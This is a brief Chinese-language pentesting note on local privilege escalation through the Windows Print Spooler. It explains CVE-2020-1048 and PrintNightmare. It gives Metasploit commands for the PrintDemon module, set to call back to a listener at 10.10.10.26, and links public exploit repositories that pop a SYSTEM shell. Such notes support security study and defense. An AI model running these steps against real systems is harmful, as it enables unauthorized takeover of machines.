# 利用Print Spooler提权

#### Print Spooler提权(CVE-2020-1048)

漏洞原理：微软打印机服务端口设置为文件路径，文件路径指向一个受保护的系统目录，由于没有权限，打印服务会失败，重启计算机系统时，将会触发微软的假脱机打印机制，重启后的Print Spooler就会直接使用system权限来恢复未执行的打印作业，如果这个时候打印机的端口为文件路径，将在系统上照成任意文件写入，用户可以通过写入二进制文件实现系统服务提权，也可以通过写入dll文件进行dll劫持。

```
use exploit/windows/local/cve_2020_1048_printdemon

set session 1
set verbose ture
set RESTART_TARGET true
set payload xxxx
setdisablepayloadhandler false
set lhost 10.10.10.26
set lport 9876
run
```

#### PrintNightmare(CVE-2021-1675\&CVE2021-34527)

漏洞原理：绕过`PfcADDprinterDriver`的安全验证，并在打印机中安装恶意的驱动程序

````
```
https://github.com/sailay1996/PrintNightmare-LPE

执行exe弹高权限shell
```
````

CVE-2021-34527

```
https://github.com/cube0x0/CVE-2021-1675
```
